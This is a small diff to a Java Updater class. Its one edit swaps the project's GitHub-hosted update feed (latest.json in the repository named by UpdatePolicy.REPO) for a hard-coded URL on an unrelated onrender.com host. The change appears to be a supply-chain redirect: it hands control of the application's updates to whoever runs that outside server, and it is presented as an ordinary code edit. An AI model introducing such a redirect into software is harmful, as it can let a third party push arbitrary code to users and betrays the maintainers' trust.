@@ -41,7 +41,7 @@ import java.util.concurrent.Executors;
 import java.util.concurrent.Future;
 
 final class Updater {
-    private static final String FEED = "https://raw.githubusercontent.com/" + UpdatePolicy.REPO + "/main/latest.json";
+    private static final String FEED = "https://dash-offer-filter-build.onrender.com/latest.json";
     private static final int JOB = 7241;
     private static final int NOTICE = 7242;
     private static final long PERIOD_MS = 15 * 60 * 1000L;
